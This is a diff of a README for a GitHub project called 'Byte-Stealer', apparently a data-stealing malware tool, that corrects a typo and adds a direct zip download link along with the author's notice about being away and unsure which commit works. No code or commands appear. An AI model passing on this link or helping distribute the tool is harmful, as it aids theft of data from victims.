@@ -3,7 +3,9 @@
  <img src="https://github.com/TurtlesXD/Byte-Stealer/blob/main/img/BYTESTEAELRDSICORDPFP.png" />
 
 
-DO NOT USE LATEST RELEASE IT WILL NOT WORK, downlaod the zip from here:
+DO NOT USE LATEST RELEASE IT WILL NOT WORK, download the zip from here:https://github.com/TurtlesXD/Byte-Stealer/archive/refs/heads/main.zip
+\
+\
 **i will not work on this repository until early september, as i am away from home. I honestly dont remember which was my last working commit, but i do believe my last release is working, so use that! If it doenst work, your probably gonna have to wait, srry.**
 
 #### Upcoming features
